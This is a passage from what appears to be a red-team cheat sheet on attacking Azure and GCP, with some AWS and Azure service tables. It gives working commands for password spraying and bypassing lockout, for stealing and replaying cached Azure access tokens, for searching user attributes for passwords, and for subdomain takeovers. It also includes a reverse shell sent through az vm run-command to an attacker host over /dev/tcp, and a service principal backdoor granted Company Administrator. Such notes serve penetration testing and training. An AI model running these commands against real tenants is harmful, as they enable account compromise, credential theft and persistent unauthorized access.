<tr><td>SWF</td><td>Amazon EC2 Queue</td><td>Build a service of "deciders" and "workers" on top of EC2 to accomplish a set task. Unlike SQS - logic is set up inside the service to determine how and what should happen.</td><td>IronWorker</td></tr>
<tr><td>Snowball</td><td>AWS Big Old Portable Storage</td><td>Get a bunch of hard drives you can attach to your network to make getting large amounts (Terabytes of Data) into and out of AWS.</td><td>Shipping a Network Attached Storage device to AWS</td></tr>
<tr><td>CloudFormation</td><td>Amazon Services Setup</td><td>Set up a bunch of connected AWS services in one go.</td><td></td></tr>
<tr><td>CloudTrail</td><td>Amazon Logging</td><td>Log who is doing what in your AWS stack (API calls).</td><td></td></tr>
<tr><td>CloudWatch</td><td>Amazon Status Pager</td><td>Get alerts about AWS services messing up or disconnecting.</td><td>PagerDuty, Statuspage</td></tr>
<tr><td>Config</td><td>Amazon Configuration Management</td><td>Keep from going insane if you have a large AWS setup and changes are happening that you want to track.</td><td></td></tr>
<tr><td>OpsWorks</td><td>Amazon Chef</td><td>Handle running your application with things like auto-scaling.</td><td></td></tr>
<tr><td>Trusted Advisor</td><td>Amazon Pennypincher</td><td>Find out where you're paying too much in your AWS setup (unused EC2 instances, etc.).</td><td></td></tr>
<tr><td>Inspector</td><td>Amazon Auditor</td><td>Scans your AWS setup to determine if you've setup it up in an insecure way</td><td>Alert Logic</td></tr>
</tbody></table>
</div>
<h2 id="aws-vs-ad"><a class="header" href="#aws-vs-ad">AWS vs AD</a></h2>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(3).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="azure"><a class="header" href="#azure">Azure</a></h1>
<h2 id="basic-info"><a class="header" href="#basic-info">Basic Info</a></h2>
<pre><code># Azure services list by domain
https://learn.microsoft.com/en-us/azure/security/fundamentals/azure-domains

# Tools 
https://github.com/dirkjanm/ROADtools
https://github.com/dafthack/PowerMeta
https://github.com/NetSPI/MicroBurst
https://github.com/nccgroup/ScoutSuite
https://github.com/hausec/PowerZure
https://github.com/fox-it/adconnectdump
https://github.com/FSecureLABS/Azurite
https://github.com/mburrough/pentestingazureapps
https://github.com/Azure/Stormspotter
https://github.com/nccgroup/azucar
https://github.com/dafthack/MSOLSpray
https://github.com/BloodHoundAD/BloodHound
https://github.com/nccgroup/Carnivore
https://github.com/CrowdStrike/CRT
https://github.com/Kyuu-Ji/Awesome-Azure-Pentest
https://github.com/cyberark/blobhunter
https://github.com/Gerenios/AADInternals
https://github.com/prowler-cloud/prowler

- Check if company is using Azure AD:
https://login.microsoftonline.com/getuserrealm.srf?login=username@COMPANY.onmicrosoft.com&amp;xml=1
- If NameSpaceType is "Managed", the company uses Azure AD
- Enumerate Azure AD emails
https://github.com/LMGsec/o365creeper

Auth methods:
• Password Hash Synchronization
   ◇ Azure AD Connect
   ◇ On-prem service synchronizes hashed user credentials to Azure
   ◇ User can authenticate directly to Azure services like O365 with their internal domain credential
• Pass Through Authentication
   ◇  Credentials stored only on-prem
   ◇ On-prem agent validates authentication requests to Azure AD
   ◇ Allows SSO to other Azure apps without creds stored in cloud
• Active Directory Federation Services (ADFS)
   ◇ Credentials stored only on-prem
   ◇ Federated trust is setup between Azure and on-prem AD to validate auth requests to the cloud
   ◇ For password attacks you would have to auth to the on-prem ADFS portal instead of Azure endpoints
• Certificate-based auth
   ◇ Client certs for authentication to API
   ◇ Certificate management in legacy Azure Service Management (ASM) makes it impossible to know who created a cert (persistence potential)
   ◇ Service Principals can be setup with certs to auth
• Conditional access policies
• Long-term access tokens
   ◇ Authentication to Azure with oAuth tokens
   ◇ Desktop CLI tools that can be used to auth store access tokens on disk
   ◇ These tokens can be reused on other MS endpoints
   ◇ We have a lab on this later!
• Legacy authentication portals

Recon:
• O365 Usage
   ◇ https://login.microsoftonline.com/getuserrealm.srf?login=username@acmecomputercompany.com&amp;xml=1
   ◇ https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@targetdomain.com?Protocol=Autodiscoverv1
• User enumeration on Azure can be performed at
    https://login.Microsoft.com/common/oauth2/token
      ▪ This endpoint tells you if a user exists or not
   ◇ Detect invalid users while password spraying with:
      ▪ https://github.com/dafthack/MSOLSpray
   ◇ For on-prem OWA/EWS you can enumerate users with timing attacks (MailSniper)
• Auth 365 Recon:
(https://github.com/nyxgeek/o365recon

Microsoft Azure Storage:
• Microsoft Azure Storage is like Amazon S3
• Blob storage is for unstructured data
• Containers and blobs can be publicly accessible via access policies
• Predictable URL’s at core.windows.net
   ◇ storage-account-name.blob.core.windows.net
   ◇ storage-account-name.file.core.windows.net
   ◇ storage-account-name.table.core.windows.net
   ◇ storage-account-name.queue.core.windows.net
• The “Blob” access policy means anyone can anonymously read blobs, but can’t list the blobs in the container
• The “Container” access policy allows for listing containers and blobs
• Microburst https://github.com/NetSPI/MicroBurst
   ◇ Invoke-EnumerateAzureBlobs
   ◇ Brute forces storage account names, containers, and files
   ◇ Uses permutations to discover storage accounts
        PS &gt; Invoke-EnumerateAzureBlobs –Base 

Password Attacks
• Password Spraying Microsoft Online (Azure/O365)
• Can spray https://login.microsoftonline.com
--
POST /common/oauth2/token HTTP/1.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Host: login.microsoftonline.com
Content-Length: 195
Expect: 100-continue
Connection: close

resource=https%3A%2F%2Fgraph.windows.net&amp;client_id=1b730954-1685-4b74-9bfd-
dac224a7b894&amp;client_info=1&amp;grant_type=password&amp;username=user%40targetdomain.com&amp;passwor
d=Winter2020&amp;scope=openid
--
• MSOLSpray https://github.com/dafthack/MSOLSpray
   ◇ The script logs:
      ▪ If a user cred is valid
      ▪ If MFA is enabled on the account
      ▪ If a tenant doesn't exist
      ▪ If a user doesn't exist
      ▪ If the account is locked
      ▪ If the account is disabled
      ▪ If the password is expired
   ◇ https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes

Password protections &amp; Smart Lockout
• Azure Password Protection – Prevents users from picking passwords with certain words like seasons, company name, etc.
• Azure Smart Lockout – Locks out auth attempts whenever brute force or spray attempts are detected.
   ◇ Can be bypassed with FireProx + MSOLSpray
   ◇ https://github.com/ustayready/fireprox

Phising session hijack
• Evilginx2 and Modlishka
   ◇ MitM frameworks for harvesting creds/sessions
   ◇ Can also evade 2FA by riding user sessions
• With a hijacked session we need to move fast
• Session timeouts can limit access
• Persistence is necessary

Steal Access Tokens
• Azure config files:
   web.config
   app.config
   .cspkg
   .publishsettings
• Azure Cloud Service Packages (.cspkg)
• Deployment files created by Visual Studio
• Possible other Azure service integration (SQL, Storage, etc.)
• Look through cspkg zip files for creds/certs
• Search Visual Studio Publish directory
    \bin\debug\publish
• Azure Publish Settings files (.publishsettings)
   ◇ Designed to make it easier for developers to push code to Azure
   ◇ Can contain a Base64 encoded Management Certificate
   ◇ Sometimes cleartext credentials
   ◇ Open publishsettings file in text editor
   ◇ Save “ManagementCertificate” section into a new .pfx file
   ◇ There is no password for the pfx
   ◇ Search the user’s Downloads directory and VS projects
• Check %USERPROFILE&amp;\.azure\ for auth tokens
• During an authenticated session with the Az PowerShell module a TokenCache.dat file gets generated in the %USERPROFILE%\.azure\ folder.
• Also search disk for other saved context files (.json)
• Multiple tokens can exist in the same context file

Post-Compromise
• What can we learn with a basic user?
• Subscription Info
• User Info
• Resource Groups
• Scavenging Runbooks for Creds
• Standard users can access Azure domain information and isn’t usually locked down
• Authenticated users can go to portal.azure.com and click Azure Active Directory
• O365 Global Address List has this info as well
• Even if portal is locked down PowerShell cmdlets will still likely work
• There is a company-wide setting that locks down the entire org from viewing Azure info via cmd line: Set-MsolCompanySettings – UsersPermissionToReadOtherUsersEnabled $false

Azure: CLI Access
• Azure Service Management (ASM or Azure “Classic”)
   ◇ Legacy and recommended to not use
• Azure Resource Manager (ARM)
   ◇ Added service principals, resource groups, and more
   ◇ Management Certs not supported
• PowerShell Modules
   ◇ Az, AzureAD &amp; MSOnline
• Azure Cross-platform CLI Tools
   ◇ Linux and Windows client

Azure: Subscriptions
• Organizations can have multiple subscriptions
• A good first step is to determine what subscription you are in
• The subscription name is usually informative
• It might have “Prod”, or “Dev” in the title
• Multiple subscriptions can be under the same Azure AD directory (tenant)
• Each subscription can have multiple resource groups

Azure User Information
• Built-In Azure Subscription Roles
   ◇ Owner (full control over resource)
   ◇ Contributor (All rights except the ability to change permissions)
   ◇ Reader (can only read attributes)
   ◇ User Access Administrator (manage user access to Azure resources)
• Get the current user’s role assignement
    PS&gt; Get-AzRoleAssignment
• If the Azure portal is locked down it is still possible to access Azure AD user information via MSOnline cmdlets
• The below examples enumerate users and groups
    PS&gt; Import-Module MSOnline
    PS&gt; Connect-MsolService
Or
    PS&gt; $credential = Get-Credential
    PS&gt; Connect-MsolService -Credential $credential
    
    PS&gt; Get-MSolUser -All
    PS&gt; Get-MSolGroup –All
    PS&gt; Get-MSolGroupMember –GroupObjectId 
    PS&gt; Get-MSolCompanyInformation
• Pipe Get-MSolUser –All to format list to get all user attributes
    PS&gt; Get-MSolUser –All | fl

Azure Resource Groups
• Resource Groups collect various services for easier management
• Recon can help identify the relationships between services such as WebApps and SQL
    PS&gt; Get-AzResource
    PS&gt; Get-AzResourceGroup
    PS&gt; Get-AzStorageAccount
Azure: Runbooks
• Azure Runbooks automate various tasks in Azure
• Require an Automation Account and can contain sensitive information like passwords
    PS&gt; Get-AzAutomationAccount
    PS&gt; Get-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName 
• Export a runbook with:
    PS&gt; Export-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName  -Name  -OutputFolder .\Desktop\

Azure VMs:
   PS&gt; Get-AzVM
   PS&gt; $vm = Get-AzVM -Name "VM Name"
   PS&gt; $vm.OSProfile
   PS&gt; Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1

Azure Virtual Networks:
   PS&gt; Get-AzVirtualNetwork
   PS&gt; Get-AzPublicIpAddress
   PS&gt; Get-AzExpressRouteCircuit
   PS&gt; Get-AzVpnConnection

# Quick 1-liner to search all Azure AD user attributes for passwords after auth'ing with Connect-MsolService:  
$x=Get-MsolUser;foreach($u in $x){$p = @();$u|gm|%{$p+=$_.Name};ForEach($s in $p){if($u.$s -like "*password*"){Write("[*]"+$u.UserPrincipalName+"["+$s+"]"+" : "+$u.$s)}}}

# https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html

# Removing Azure services
- Under Azure Portal -&gt; Resource Groups

# Interesting metadata instance urls:
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text
</code></pre>
<h2 id="traditional-ad---azure-ad-comparision"><a class="header" href="#traditional-ad---azure-ad-comparision"><strong>Traditional AD - Azure AD comparision</strong></a></h2>
<p><img src="enumeration/cloud/../../.gitbook/assets/AzureADvsAD%5B1%5D.png" alt="" /></p>
<h3 id="basic-azure-ad-concepts-and-tips"><a class="header" href="#basic-azure-ad-concepts-and-tips"><strong>Basic Azure AD concepts and tips</strong></a></h3>
<pre><code>- Source of authentication for Office 365, Azure Resource Manager, and anything else you integrate with it.

- Powershell interaction:
• MSOnline PowerShell module
    • Focusses on Office 365
    • Some Office 365 specific features
• AzureAD PowerShell module
    • General Azure AD
    • Different feature set
• Azure CLI / Az powershell module
    • More focus on Azure Resource Manager
    
- Azure AD principals
• Users
• Devices
• Applications

- Azure AD roles
• RBAC Roles are only used for Azure Resource Manager
• Office 365 uses administrator roles exclusively

- Azure AD admin roles
• Global/Company administrator can do anything
• Limited administrator accounts
    • Application Administrator
    • Authentication Administrator
    • Exchange Administrator
    • Etc
• Roles are fixed

- Azure AD applications
• Documentation unclear
• Terminology different between documentation, APIs and Azure portal
• Complex permission system
• Most confusing part
• Examples:
    • Microsoft Graph
    • Azure Multi-Factor Auth Client
    • Azure Portal
    • Office 365 portal
    • Azure ATP
• A default Office 365 Azure AD has about 200 service principals
    (read: applications)
- App permissions
• Two types of privileges:
    • Delegated permissions
    • Require signed-in user present to utilize
• Application permissions
    • Are assigned to the application, which can use them at any time
• These privileges are assigned to the service principal
• Every application defines permissions
• Can be granted to Service Principals
• Commonly used:
    • Microsoft Graph permissions
    • Azure AD Graph permissions
    
- Azure AD Sync Account
• Dump all on-premise password hashes (if PHS is enabled)
• Log in on the Azure portal (since it’s a user)
• Bypass conditional access policies for admin accounts
• Add credentials to service principals
• Modify service principals properties

If password hash sync is in use:
Compromised Azure AD connect Sync account = Compromised AD

• Encryption key is encrypted with DPAPI
• Decrypted version contains some blob with AES keys
• Uses AES-256 in CBC mode

Anyone with control over Service Principals can assign credentials to them and potentially escalate privileges.

Anyone who can edit properties* of the AZUREADSSOACC$ account, can impersonate any user in Azure AD using Kerberos (if no MFA)

</code></pre>
<h2 id="azure-enum"><a class="header" href="#azure-enum"><strong>Azure enum</strong></a></h2>
<p>visit: https://o365blog.com/aadinternals/#get-aadinttenantdomains</p>
<pre><code># Must install
# https://github.com/Gerenios/AADInternals 
# https://github.com/NetSPI/MicroBurst

# Get Tenant Name
https://login.microsoftonline.com/getuserrealm.srf?login=admin@COMPANY.onmicrosoft.com&amp;xml=1

# Get Tenant ID with AADInternals
Get-AADIntTenantID -Domain COMPANY.onmicrosoft.com
# Get Tenant ID manually
https://login.microsoftonline.com/COMPANY.onmicrosoft.com/.well-known/openid-configuration

# Get Tenant Domains
Get-AADIntTenantDomains -Domain COMPANY.com

# Get valid email addresses
# https://github.com/Raikia/UhOh365

# Azure Services (MicroBurst)
Invoke-EnumerateAzureSubDomains -Base COMPANY -Verbose

# Azure Blobs (MicroBurst)
Invoke-EnumerateAzureBlobs -Base COMPANY

# Azure Users on Tenant (Az Module)
Get-AzureADUser -All $true

# Azure Groups on Tenant (Az Module)
Get-AzureADGroup -All $true

# Get user's read permissions on Azure Resources (Az Module)
Get-AzResource

# List Dynamic Groups (Az Module)
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}

# List Membership group rules (Az Module)
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} | select MembershipRule
</code></pre>
<h2 id="azure-attacks-examples"><a class="header" href="#azure-attacks-examples"><strong>Azure attacks examples</strong></a></h2>
<pre><code># Password spraying
https://github.com/dafthack/MSOLSpray/MSOLSpray.ps1
Create a text file with ten (10) fake users we will spray along with your own user account (YourAzureADUser@youraccount.onmicrosoft.com ). (Do not spray accounts you do not own. You may use my domain “glitchcloud.com” for generating fake target users) and save as userlist.txt

Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password [the password you set for your test account]

# Access Token

PS&gt; Import-Module Az
PS&gt; Connect-AzAccount
or
PS&gt; $credential = Get-Credential
PS&gt;Connect-AzAccount -Credential $credential

PS&gt; mkdir C:\Temp
PS&gt; Save-AzContext -Path C:\Temp\AzureAccessToken.json
PS&gt; mkdir “C:\Temp\Live Tokens”

# Auth
Connect-AzAccount
## Or this way sometimes gets around MFA restrictions
$credential = Get-Credential
Connect-AzAccount -Credential $credential

Open Windows Explorer and type %USERPROFILE%\.Azure\ and hit enter
• Copy TokenCache.dat &amp; AzureRmContext.json to C:\Temp\Live Tokens
• Now close your authenticated PowerShell window!

Delete everything in %USERPROFILE%\.azure\
• Start a brand new PowerShell window and run:
PS&gt; Import-Module Az
PS&gt; Get-AzContext -ListAvailable
• You shouldn’t see any available contexts currently

• In your PowerShell window let’s manipulate the stolen TokenCache.dat and AzureRmContext.json files so we can import it into our PowerShell session

PS&gt; $bytes = Get-Content "C:\Temp\Live Tokens\TokenCache.dat" -Encoding byte
PS&gt; $b64 = [Convert]::ToBase64String($bytes)
PS&gt; Add-Content "C:\Temp\Live Tokens\b64-token.txt" $b64

• Now let’s add the b64-token.txt to the AzureRmContext.json file.
• Open the C:\Temp\Live Tokens folder.
• Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.
• Delete the word “null” on this line
• Where “null” was add two quotation marks (“”) and then paste the contents of b64-token.txt in between them.
• Save this file as C:\Temp\Live Tokens\StolenToken.json
• Let’s import the new token

PS&gt; Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json’

• We are now operating in an authenticated session to Azure

PS&gt; $context = Get-AzContext
PS&gt; $context.Account

• You can import the previously exported context (AzureAccessToken.json) the same way

# Azure situational awareness
• GOAL: Use the MSOnline and Az PowerShell modules to do basic enumeration of an Azure account post-compromise.
• In this lab you will authenticate to Azure using your Azure AD account you setup. Then, you will import the MSOnline and Az PowerShell modules and try out some of the various modules that assist in enumerating Azure resource usage.

• Start a new PowerShell window and import both the MSOnline and Az modules
    PS&gt; Import-Module MSOnline
    PS&gt; Import-Module Az
• Authenticate to each service with your Azure AD account:
    PS&gt; Connect-AzAccount
    PS&gt; Connect-MsolService
• First get some basic Azure information 
    PS&gt; Get-MSolCompanyInformation
• Some interesting items here are
   ◇ UsersPermissionToReadOtherUsersEnabled
   ◇ DirSyncServiceAccount
   ◇ PasswordSynchronizationEnabled
   ◇ Address/phone/emails
• Next, we will start looking at the subscriptions associated with the account as well as look at the current context we are operating in. Look at the “Name” of the subscription and context for possible indication as to what it is associated with.
    PS&gt; Get-AzSubscription
    PS&gt; $context = Get-AzContext
    PS&gt; $context.Name
    PS&gt; $context.Account
• Enumerating the roles assigned to your user will help identify what permissions you might have on the subscription as well as who to target for escalation.
    PS&gt; Get-AzRoleAssignment
• List out the users on the subscription. This is the equivalent of “net users /domain” in on-prem AD
    PS&gt; Get-MSolUser -All
    PS&gt; Get-AzAdApplication
    PS&gt; Get-AzWebApp
    PS&gt; Get-AzSQLServer
    PS&gt; Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName
    PS&gt; Get-AzSqlServerFirewallRule –ServerName $ServerName -ResourceGroupName $ResourceGroupName
    PS&gt; Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName
• The user you setup likely doesn’t have any resources currently associated with it, but these commands will help to understand the specific resources a user you gain access to has.
    PS&gt; Get-AzResource
    PS&gt; Get-AzResourceGroup
• Choose a subscription
    PS&gt; Select-AzSubscription -SubscriptionID "SubscriptionID"
• There are many other functions.
• Use Get-Module to list out the other Az module groups
• To list out functions available within each module use the below command substituting the value of the “Name” parameter.
    PS&gt; Get-Module -Name Az.Accounts | Select-Object -ExpandProperty ExportedCommands
    PS&gt; Get-Module -Name MSOnline | Select-Object -ExpandProperty ExportedCommands
</code></pre>
<h2 id="azure-block-blobs-s3-equivalent-attacks"><a class="header" href="#azure-block-blobs-s3-equivalent-attacks"><strong>Azure Block Blobs (S3 equivalent) attacks</strong></a></h2>
<pre><code># Discovering with Google Dorks
site:*.blob.core.windows.net
site:*.blob.core.windows.net ext:xlsx | ext:csv "password"
# Discovering with Dns enumeration
python dnscan.py -d blob.core.windows.net -w subdomains-100.txt

# When you found one try with curl, an empty container respond with 400

# List containers
az storage container list --connection-string '&lt;connection string&gt;'
# List blobs in containers
az storage blob list --container-name &lt;container name&gt; --connection-string '&lt;connection string&gt;'
# Download blob from container
az storage blob download --container-name &lt;container name&gt; --name &lt;file&gt; --file /tmp/&lt;file&gt; --connection-string '&lt;connection string&gt;'
</code></pre>
<h2 id="azure-subdomain-takeovers"><a class="header" href="#azure-subdomain-takeovers">Azure subdomain takeovers</a></h2>
<pre><code># Azure CloudApp: cloudapp.net
    1 Check CNAME with dig pointing to cloudapp.net
    2 Go to https://portal.azure.com/?quickstart=True#create/Microsoft.CloudService
    3 Register unclaimed domain which CNAME is pointing


# Azure Websites: azurewebsites.net
    1 Check CNAME with dig pointing to azurewebsites.net
    2 Go to https://portal.azure.com/#create/Microsoft.WebSite
    3 Register unclaimed domain which CNAME is pointing
    4 Register domain on the Custom domains section of the dashboard

# Azure VM: cloudapp.azure.com
    1 Check CNAME with dig pointing to *.region.cloudapp.azure.com
    2 Registering a new VM in the same region with size Standard_B1ls (cheapest) with 80 and 443 open
    3 Go to Configuration and set the domain name which CNAME is pointing    
</code></pre>
<h2 id="other-azure-services"><a class="header" href="#other-azure-services"><strong>Other Azure Services</strong></a></h2>
<pre><code># Azure App Services Subdomain Takeover
- For target example.com you found users.example.com
- Go https://users.galaxybutter.com and got an error
- dig CNAME users.galaxybutter.com and get an Azure App Services probably deprecated or removed
- Creat an App Service and point it to the missing CNAME
- Add a custom domain to the App Service
- Show custom content

# Azure Run Command
# Feature that allows you to execute commands without requiring SSH or SMB/RDP access to a machine. This is very similar to AWS SSM.
az login
az login --use-device-code #Login
az group list #List groups
az vm list -g GROUP-NAME #List VMs inside group
#Linux VM
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "id"
#Windos VM
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunPowerShellScript --scripts "whoami"
# Linux Reverse Shell Azure Command
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "bash -c \"bash -i &gt;&amp; /dev/tcp/ATTACKER-EXTERNAL-IP/9090 0&gt;&amp;1\""

# Azure SQL Databases
- MSSQL syntaxis
- Dorks: "database.windows.net" site:pastebin.com

# Azure AD commands
az ad sp list --all
az ad app list --all

# Azure metadata service
http://169.254.169.254/metadata/instance
https://github.com/microsoft/azureimds
</code></pre>
<h3 id="create-azure-service-principal-as-backdoor"><a class="header" href="#create-azure-service-principal-as-backdoor">Create Azure service principal as backdoor</a></h3>
<pre><code>$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
$BSTR = ::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = ::PtrToStringAuto($BSTR)
$UnsecureSecret
$sp = Get-MsolServicePrincipal -AppPrincipalId &lt;AppID&gt;
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -
RoleMemberObjectId $sp.ObjectId
#Enter the AppID as username and what was returned for $UnsecureSecret as the password
in the Get-Credential prompt
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
</code></pre>
<h2 id="azure-password-reset"><a class="header" href="#azure-password-reset">Azure password reset</a></h2>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(50).png" alt="" /></p>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(48).png" alt="" /></p>
<h2 id="azure-services-summary"><a class="header" href="#azure-services-summary">Azure Services Summary</a></h2>
<p><strong>Base services</strong></p>
<div class="table-wrapper"><table><thead><tr><th>Azure Service</th><th>Could be Called</th><th>Use this to...</th><th>Like AWS...</th></tr></thead><tbody>
<tr><td>Virtual Machines</td><td>Servers</td><td>Move existing apps to the cloud without changing them. You manage the entire computer.</td><td>EC2</td></tr>
<tr><td>Cloud Services</td><td>Managed Virtual Machines</td><td>Run applications on virtual machines that you don't have to manage, but can partially manage.</td><td></td></tr>
<tr><td>Batch</td><td>Azure Distributed Processing</td><td>Work on a large chunk of data by divvying it up between a whole bunch of machines.</td><td></td></tr>
<tr><td>RemoteApp</td><td>Remote Desktop for Apps</td><td>Expose non-web apps to users. For example, run Excel on your iPad.</td><td>AppStream</td></tr>
<tr><td>Web Apps</td><td>Web Site Host</td><td>Run websites (.NET, Node.js, etc.) without managing anything extra. Scale automatically and easily.</td><td>Elastic Beanstalk</td></tr>
<tr><td>Mobile Apps</td><td>Mobile App Accelerator</td><td>Quickly get an app backend up and running.</td><td></td></tr>
<tr><td>Logic Apps</td><td>Visio for Doing Stuff</td><td>Chain steps together to get stuff done.</td><td></td></tr>
<tr><td>API Apps</td><td>API Host</td><td>Host your API's without any of the management overhead.</td><td></td></tr>
<tr><td>API Management</td><td>API Proxy</td><td>Expose an API and off-load things like billing, authentication, and caching.</td><td>API Gateway</td></tr>
</tbody></table>
</div>
<p><strong>Mobile</strong></p>
<div class="table-wrapper"><table><thead><tr><th>Azure Service</th><th>Could be Called</th><th>Use this to...</th><th>Like AWS...</th></tr></thead><tbody>
<tr><td>Notification Hubs</td><td>Notification Blaster</td><td>Send notifications to all of your users, or groups of users based on things like zip code. All platforms.</td><td>SNS</td></tr>
<tr><td>Mobile Engagement</td><td>Mobile Psychic</td><td>Track what users are doing in your app, and customize experience based on this data.</td><td></td></tr>
</tbody></table>
</div>
<p><strong>Storage</strong></p>
<div class="table-wrapper"><table><thead><tr><th>Azure Service</th><th>Could be Called</th><th>Use this to...</th><th>Like AWS...</th></tr></thead><tbody>
<tr><td>SQL Database</td><td>Azure SQL</td><td>Use the power of a SQL Server cluster without having to manage it.</td><td>RDS</td></tr>
<tr><td>Document DB</td><td>Azure NoSQL</td><td>Use an unstructured JSON database without having to manage it.</td><td>Dynamo DB</td></tr>
<tr><td>Redis Cache</td><td>Easy Cache</td><td>Cache files in memory in a scalable way.</td><td>Elasticache</td></tr>
<tr><td>Storage Blobs</td><td>Cloud File System</td><td>Store files, virtual disks, and build other storage services on top of.</td><td>S3</td></tr>
<tr><td>Azure Search</td><td>Index &amp; Search</td><td>Add search capabilities to your website, or index data stored somewhere else.</td><td>CloudSearch</td></tr>
<tr><td>SQL Data Warehouse</td><td>Structured Report Database</td><td>Store all of your company's data in a structured format for reporting.</td><td>RedShift</td></tr>
<tr><td>Azure Data Lake</td><td>Unstructured Report Database</td><td>Store all of your company's data in any format for reporting.</td><td></td></tr>
<tr><td>HDInsight</td><td>Hosted Hadoop</td><td>Do Hadoopy things with massive amounts of data.</td><td></td></tr>
<tr><td>Machine Learning</td><td>Skynet</td><td>Train AI to predict the future using existing data. Examples include credit card fraud detection and Netflix movie recommendations.</td><td></td></tr>
<tr><td>Stream Analytics</td><td>Real-time data query</td><td>Look for patterns in data as it arrives.</td><td></td></tr>
<tr><td>Data Factory</td><td>Azure ETL</td><td>Orchestrate extract, transform, and load data processes.</td><td>Data Pipeline</td></tr>
<tr><td>Event Hubs</td><td>IoT Ingestor</td><td>Ingest data at ANY scale inexpensively.</td><td></td></tr>
</tbody></table>
</div>
<p><strong>Networking</strong></p>
<div class="table-wrapper"><table><thead><tr><th>Azure Service</th><th>Could be Called</th><th>Use this to...</th><th>Like AWS...</th></tr></thead><tbody>
<tr><td>Virtual Network</td><td>Private Network</td><td>Put machines on the same, private network so that they talk to each other directly and privately. Expose services to the internet as needed.</td><td></td></tr>
<tr><td>ExpressRoute</td><td>Fiber to Azure</td><td>Connect privately over an insanely fast pipe to an Azure datacenter. Make your local network part of your Azure network.</td><td>Direct Connect</td></tr>
<tr><td>Load Balancer</td><td>Load Balancer</td><td>Split load between multiple services, and handle failures.</td><td></td></tr>
<tr><td>Traffic Manager</td><td>Datacenter Load Balancer</td><td>Split load between multiple datacenters, and handle datacenter outages.</td><td></td></tr>
<tr><td>DNS</td><td>DNS Provider</td><td>Run a DNS server so that your domain names map to the correct IP addresses.</td><td>Route53</td></tr>
<tr><td>VPN Gateway</td><td>Virtual Fiber to Azure</td><td>Connect privately to an Azure datacenter. Make your local network part of your Azure network.</td><td></td></tr>
<tr><td>Application Gateway</td><td>Web Site Proxy</td><td>Proxy all of your HTTP traffic. Host your SSL certs. Load balance with sticky sessions.</td><td></td></tr>
<tr><td>CDN</td><td>CDN</td><td>Make your sites faster and more scalable by putting your static files on servers around the world close to your end users.</td><td>Cloudfront</td></tr>
<tr><td>Media Services</td><td>Video Processor</td><td>Transcode video and distribute and manage it on the scale of the Olympics.</td><td>Elastic Transcoder</td></tr>
</tbody></table>
</div>
<p><strong>Management</strong></p>
<div class="table-wrapper"><table><thead><tr><th>Azure Service</th><th>Could be Called</th><th>Use this to...</th><th>Like AWS...</th></tr></thead><tbody>
<tr><td>Azure Resource Manager</td><td>Declarative Configuration</td><td>Define your entire Azure architecture as a repeatable JSON file and deploy all at once.</td><td>CloudFormation</td></tr>
</tbody></table>
</div>
<p><strong>Developer</strong></p>
<div class="table-wrapper"><table><thead><tr><th><strong>Azure Service</strong></th><th><strong>Could be Called</strong></th><th><strong>Use this to...</strong></th><th><strong>Like AWS...</strong></th></tr></thead><tbody>
<tr><td>Application Insights</td><td>App Analytics</td><td>View detailed information about how your apps (web, mobile, etc.) are used.</td><td>Mobile Analytics</td></tr>
<tr><td>Service Fabric</td><td>Cloud App Framework</td><td>Build a cloud optimized application that can scale and handle failures inexpensively.</td><td></td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="gcp"><a class="header" href="#gcp">GCP</a></h1>
<p>https://slashparity.com/?p=938</p>
<h2 id="general-6"><a class="header" href="#general-6">General</a></h2>
<pre><code>**Tools**
# PurplePanda https://github.com/carlospolop/PurplePanda
# Hayat https://github.com/DenizParlak/hayat
# GCPBucketBrute https://github.com/RhinoSecurityLabs/GCPBucketBrute
# GCP IAM https://github.com/marcin-kolda/gcp-iam-collector
# GCP Firewall Enum: https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum
# Prowler https://github.com/prowler-cloud/prowler

Auth methods:
• Web Access
• API – OAuth 2.0 protocol
• Access tokens – short lived access tokens for service accounts
• JSON Key Files – Long-lived key-pairs
• Credentials can be federated

Recon:
• G-Suite Usage
   ◇ Try authenticating with a valid company email address at Gmail

Google Storage Buckets:
• Google Cloud Platform also has a storage service called “Buckets”
• Cloud_enum from Chris Moberly (@initstring) https://github.com/initstring/cloud_enum
   ◇ Awesome tool for scanning all three cloud services for buckets and more
      ▪ Enumerates:
         - GCP open and protected buckets as well as Google App Engine sites
         - Azure storage accounts, blob containers, hosted DBs, VMs, and WebApps
         - AWS open and protected buckets

Phising G-Suite:
• Calendar Event Injection
• Silently injects events to target calendars
• No email required
